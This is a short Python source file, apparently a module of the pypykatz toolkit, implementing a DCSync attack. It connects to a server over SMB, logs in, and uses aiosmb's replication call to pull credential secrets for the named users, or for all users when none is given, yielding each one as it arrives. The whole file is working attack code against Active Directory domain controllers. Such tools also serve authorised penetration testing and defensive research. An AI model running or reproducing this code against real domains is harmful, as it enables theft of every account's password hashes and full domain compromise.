import asyncio
from pypykatz import logging

async def dcsync(url, username = None):
	from aiosmb.commons.connection.url import SMBConnectionURL
	from aiosmb.commons.interfaces.machine import SMBMachine

	smburl = SMBConnectionURL(url)
	connection = smburl.get_connection()

	users = []
	if username is not None:
		users.append(username)

	async with connection:
		logging.debug('[DCSYNC] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logging.debug('[DCSYNC] Connected to server!')
		logging.debug('[DCSYNC] Running...')

		i = 0
		async with SMBMachine(connection) as machine:
			async for secret, err in machine.dcsync(target_users=users):
				if err is not None:
					raise err
				i += 1
				if i % 1000 == 0:
					logging.debug('[DCSYNC] Running... %s' % i)
				await asyncio.sleep(0)
				yield secret
		
		logging.debug('[DCSYNC] Finished!')
		